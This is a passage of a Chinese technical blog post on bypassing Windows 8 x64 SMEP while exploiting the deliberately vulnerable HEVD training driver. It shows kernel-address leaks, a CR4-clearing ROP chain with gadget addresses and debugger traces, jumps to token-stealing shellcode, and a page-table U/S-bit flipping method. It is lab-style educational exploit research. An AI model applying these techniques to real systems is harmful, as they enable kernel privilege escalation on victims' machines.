    nt!ExpQuerySystemInformation+0x5b1://处于恢复状态
    fffff801`dc7d19dd 6685c0          test    ax,ax
    kd> dt nt!_KTHREAD KernelApcDisable ffffe00001cac880
       +0x1e4 KernelApcDisable : 0n0
返回后，直接读取这个buffer，对应就是RTL_PROCESS_MODULES对象，直接读对象的ImageAddress就是模块内核地址了，然后就是构造ROP
    typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;                 // Not filled in
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[ 256 ];
    } RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
    typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
    } RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
接下来我们来看一下通过IDA反汇编的相关函数的伪代码，对应内容我在代码后面写了注释。
    int __fastcall ExpQuerySystemInformation(signed int a1, int *a2, unsigned int a3, unsigned __int64 a4, unsigned int Size, signed int *a6)
    {
                    ⋯⋯
                v7 = a1;//将功能号的值交给v7
                ⋯⋯
            if ( v7 == 11 )//在ExpQuerySystemInformation中会有很多if语句对功能号进行判断，对应功能号执行对应操作，当功能号为11时
            {
              if ( ExIsRestrictedCaller((unsigned int)(v7 - 11), a2, 5368709120i64) )//检查是否是受限调用
                return -1073741790;
              *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) = *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) - 1;
              ExAcquireResourceExclusiveLite(&PsLoadedModuleResource, v11);//v11的值为1，会等待当前资源释放
              v35 = ExpQueryModuleInformation(v34, (_DWORD *)v6, v12, &v166);//PsLoadedModuleList链读取Modules信息，RTL_PROCESS_MODULES结构
    LABEL_95:
              v165 = v35;
              ExReleaseResourceLite(&PsLoadedModuleResource);//释放资源
              v36 = *MK_FP(__GS__, 392i64);
              v37 = *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) + 1;
              *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) = v37;
              if ( !v37 && *(_QWORD *)(v36 + 152) != v36 + 152 && !*(_WORD *)(v36 + 486) )
                KiCheckForKernelApcDelivery();
              goto LABEL_40;
            }
            ⋯⋯
    }
**0x03 bypass SMEP ROP chain**
在Win8 x64 Medium Integrity下，可以用NtQueryInformation直接获得bypass SMEP的ROP
chain。首先可以得到nt的kernel address，通过NTQuerySystemInformation。
    kd> p
    Bypass_SMEP!GetKernelBase+0x8b:
    0033:00007ff7`0075108b 33d2            xor     edx,edx
    kd> r rbx
    rbx=fffff801dc403000
这个nt kernel address就是fffff801dc403000，我们接下来构造的ROP
chain可以在nt中找到。关于SMEP的控制，取决于cr4寄存器，这个寄存器的比特位们代表了不同的内容。其中，第20位表示的是SMEP的开关。我们可以利用ROP
Chain来关闭这个比特位。因此我们需要2个ROP gadgets。
    fffff801`dc54fa10 nt!HvlEndSystemInterrupt =    506f8   909090909090    +14CA30
    0033:fffff801`dc54fa30 59              pop     rcx
    0033:fffff801`dc54fa31 c3              ret
    fffff801`dc5ddba8 nt!KeWakeProcessor =  1506f8    +1DABFC
    0033:fffff801`dc5ddbfc 0f22e1          mov     cr4,rcx
    0033:fffff801`dc5ddbff c3              ret
第一个用于将想修改的cr4的值，交给rcx，第二个用于修改cr4寄存器的值。获取win8下cr4的值，其中，第20bit描述的是SMEP，将其置0关闭SMEP。
    kd> bc 0
    kd> g
    Breakpoint 1 hit
    HEVD!TriggerStackOverflow+0x11c://驱动返回位置
    fffff800`02280bfc c3              ret
    kd> r rsp
    rsp=ffffd0002381e7c8
    kd> dd ffffd0002381e7c8//由于栈溢出，返回地址被覆盖，先是ROP Chain
    ffffd000`2381e7c8  dc54fa30 fffff801 000506f8 00000000
    ffffd000`2381e7d8  dc5ddbfc fffff801 00a60000 00000000
    ffffd000`2381e7e8  90909090 90909090 90909090 90909090
    ffffd000`2381e7f8  90909090 90909090 dc54fa30 fffff801
    ffffd000`2381e808  001506f8 00000000 dc5ddbfc fffff801
    ffffd000`2381e818  02281f6e fffff800 0231d010 ffffe000
    ffffd000`2381e828  0231d0e0 ffffe000 03c3aa80 ffffe000
    ffffd000`2381e838  0000000e 00000000 00222003 00000000
    kd> p//进入第一个ROP gadget  pop rcx获取要修改cr4的值
    nt+0x14ca30:
    fffff801`dc54fa30 59              pop     rcx
    kd> p
    nt+0x14ca31:
    fffff801`dc54fa31 c3              ret
    kd> p//将rcx交给cr4，修改cr4的值
    nt+0x1dabfc:
    fffff801`dc5ddbfc 0f22e1          mov     cr4,rcx
    kd> r cr4//cr4当前值，20bit位置值为1
    cr4=00000000001506f8
    kd> p
    nt+0x1dabff:
    fffff801`dc5ddbff c3              ret
    kd> r cr4//修改后，20bit位置值为0
    cr4=00000000000506f8
    kd> p//ret后进入shellcode部分，可以执行了
    00000000`00a60000 65488b142588010000 mov   rdx,qword ptr gs:[188h]
    kd> p
    00000000`00a60009 4c8b82b8000000  mov     r8,qword ptr [rdx+0B8h]
可以看到，这次跳转到a60000这个用户地址空间后，也可以继续执行shellcode代码了，cr4的20bit位置置0了，SMEP并没有工作，等待替换token之后，再将cr4寄存器恢复即可。最后提权完成。
**0x04 另一种SMEP绕过方法**
在开头，我提到了一篇比较有意思的show
case，里面提到了一种另类的ROP方法，就是用来欺骗SMEP，在pxe中，有一位表示的是U/S，如果我们将这一位修改，让SMEP认为用户空间是可以执行代码的。
首先，我们需要修改之前NtQuerySystemInformation函数获取的内容，来获取hal的内核地址。
    00000000`01120140  68828000 fffff801 00075000 08804000  ...h.....P...@..
    00000000`01120150  00000001 00150022 7379535c 526d6574  ...."...SystemR
    00000000`01120160  5c746f6f 74737973 32336d65 6c61685c  ootsystem32hal
    00000000`01120170  6c6c642e 00000000 00000000 00000000  .dll............
    0033:00007ff7`157e10b0 4963c3          movsxd  rax,r11d
    0033:00007ff7`157e10b3 4869c028010000  imul    rax,rax,128h//获得距离SYSTEM_MODULE_INFORMATION起始地址的偏移
    0033:00007ff7`157e10ba 488d4c3830      lea     rcx,[rax+rdi+30h]//30h是模块名称成员距离模块起始的偏移，rcx得到模块成员名称的地址
    0033:00007ff7`157e10bf 493bc9          cmp     rcx,r9//判断模块名称是否是我们需要的模块名称
    0033:00007ff7`157e10c2 7503            jne     Bypass_SMEP!GetKernelBase+0xc7 (00007ff7`157e10c7)
    0033:00007ff7`157e10c4 488b1a          mov     rbx,qword ptr [rdx]
    0033:00007ff7`157e10c7 41ffc3          inc     r11d
修改的源码如下：
        Int_3();
        NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
        //try to catch HAL kernel address
        for(i=0;iNumberOfModules;i++)
        {
            if(!strcmp(ModuleInfo->Module[i].Name,"\SystemRoot\system32\hal.dll"))
            {
                kernelBase = ModuleInfo->Module[i].ImageBaseAddress;
                break;
            }
        }
在构造rop chain的时候，我们需要下面几个rop gadgets。
1、mov rsp,48000000df jmp to user space//maybe不用？
2、pop rcx with 0x63 to reset pxe
3、pop rax with pxe(my_addr)-3
4、mov [rax],ecx
5、invalid TLB(会更新PTE，导致U/S位失效)wbinvd
6、ret to shellcode
本来想试验这个过程，但是有些rop gadget无法获取了，读那个文章中，作者提到了一个stack
pivot的地址，利用的是HalpTscTraceProcessorSynchronization函数中的一个位置，可以使rsp栈帧跳转到480000df地址，这是可以通过用户申请的。
但我没有找到这样的地址，我尝试在hal内存空间中搜索这样的rop
gadget，也没有找到，但我觉得这个并不影响，可以通过virtualalloc申请，把第二个rop gadget先覆盖在ret即可。
第二个rop gadget需要将0x63赋值给rcx寄存器，这个值用于重新设置pxe中的U/S位。
第三个rop gadget需要将pxe的值交给rax。
    kd> !pte fffff80aa2c35bfc
                                               VA fffff80aa2c35bfc
    PXE at FFFFF6FB7DBEDF80    PPE at FFFFF6FB7DBF0150    PDE at FFFFF6FB7E02A8B0    PTE at FFFFF6FC055161A8
    Unable to get PXE FFFFF6FB7DBEDF80
第四个rop gadget需要修改pxe的u/s位，也就是mov [rax],ecx。
这里比较有趣的就是第五个rop gadget，这是hal.dll中的一个invalid TLB
cache，禁用快表，因为虚拟地址和物理地址转换的时候，有可能会去TLB中直接搜索缓存的地址，如果命中就直接提取。
这里禁用TLB之后，就可以直接去PTE中找对应地址。令我们修改后的U/S起效果。wbinvd汇编指令会禁用这个缓存。
    .text:00000001C003B8A0 HalpAcpiFlushCache proc near            ; CODE XREF: HalpFlushAndWait+9p
    .text:00000001C003B8A0                                         ; HalpDpOfflineProcessorForReplace+57p
    .text:00000001C003B8A0                                         ; DATA XREF: ...
    .text:00000001C003B8A0                 wbinvd
    .text:00000001C003B8A2                 retn
    .text:00000001C003B8A2 HalpAcpiFlushCache endp
个人感觉比较好用的还是cr4的方法，后者之所以提及，是因为pxe和invalid TLB这两个rop
gadget的方法特别有意思。关于SMEP的绕过方法应该还有，内核有很多可以开脑洞的地方，期待更多的研究成果与大家分享，感谢！
**传送门**
* * *
**[【技术分享】HEVD内核漏洞训练——陪Windows玩儿](http://bobao.360.cn/learning/detail/3544.html)**